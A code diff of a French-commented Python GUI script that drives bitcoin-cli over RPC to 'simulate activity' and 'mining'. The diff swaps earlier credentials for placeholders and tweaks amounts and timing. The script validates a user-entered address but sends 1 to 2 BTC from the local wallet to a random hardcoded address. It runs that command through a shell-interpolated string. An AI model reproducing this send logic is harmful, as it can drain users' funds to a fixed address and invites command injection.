@@ -20,11 +20,12 @@ else:
     datadir = "/Users/francisc/Library/Application Support/Bitcoin"
 
 # Paramètres de connexion RPC
-rpcuser = "papa"
-rpcpassword = "marc"
+rpcuser = "user"
+rpcpassword = "password"
 rpcport = "9332"
 
-# Adresses de test pour simulation d'activité Carmen
+# Adresses de test pour simulation d'activité Wallet. YOUR ADDRESSE !!!
+# Si tu ne change pas ces adresses les newbitcoins evoiye seront perdu !!!
 addresses_list = [
     "bc1qgam2g3thvszfhnjyswpv0hxfdp5zpqg483ulnr",
     "bc1qgam2g3thvszfhnjyswpv0hxfdp5zpqg483ulnr"
@@ -92,7 +93,7 @@ def simulate_activity():
         address = address_entry.get()
         if validate_address(address):
             random_address = random.choice(addresses_list)
-            amount = random.uniform(1, 3)
+            amount = random.uniform(1, 2)
             command = f"{bitcoin_cli} -rpcuser={rpcuser} -rpcpassword={rpcpassword} -rpcport={rpcport} sendtoaddress {random_address} {amount:.8f}"
             try:
                 subprocess.check_output(command, shell=True)
@@ -185,7 +186,7 @@ def demarrer_minage():
 
         log_text.yview(tk.END)  # Faire défiler vers le bas
         log_text.update()  # Mettre à jour le texte à l'écran
-        time.sleep(1)
+        time.sleep(600)
 
 
 # Interface utilisateur
